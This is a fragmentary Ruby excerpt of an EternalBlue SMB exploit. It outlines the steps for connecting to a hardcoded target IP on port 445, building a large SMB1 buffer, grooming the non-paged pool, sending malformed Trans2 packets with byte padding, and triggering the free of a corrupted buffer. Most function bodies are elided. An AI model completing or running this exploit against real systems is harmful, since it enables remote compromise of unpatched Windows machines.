...
def smb_eternalblue(process_name, grooms)
    ...
    print("Connecting to target for exploitation.")
    ...
    print("Trying exploit with #{grooms} Groom Allocations.")

    # Step 2: Create a large SMB1 buffer
    print("Sending all but last fragment of exploit packet")
    smb1_large_buffer(client, tree, sock)

    # Step 3: Groom the pool with payload packets, and open/close SMB1 packets
    print("Starting non-paged pool grooming")
    ...
    print("Sending egg to corrupted connection.")
    ...
    print("Triggering free of corrupted buffer.")
    # tree disconnect
    # logoff and x
...
def print_core_buffer(os)
  print("CORE raw buffer dump (#{os.length.to_s} bytes)")
...
def smb1_large_buffer(client, tree, sock)
  ...
  # send NT Trans
  vprint("Sending NT Trans Request packet")
  sock.put(nt_trans_pkt)

  vprint("Receiving NT Trans packet")
  raw = sock.get_once
  ...
  vprint("Sending malformed Trans2 packets")
...
def smb1_free_hole(start)
  ...
  vprint("Receiving free hole response.")
  sock.get_once
...
def make_smb1_trans2_exploit_packet(tree_id, user_id, type, timeout)
  ...
  if type == :eb_trans2_exploit
    vprint("Making :eb_trans2_exploit packet")
  ...
  if type == :eb_trans2_zero
    vprint("Making :eb_trans2_zero packet")
    pkt << "\x00" * 2055
    pkt << "\x83\xf3"
    pkt << "\x41" * 2039
    #pkt << "\x00" * 4096
  else
    vprint("Making :eb_trans2_buffer packet")
    pkt << "\x41" * 4096
  end
...
def connect_target
  sock = TCPSocket.open( '192.168.126.128', '445' );
  sock;
end
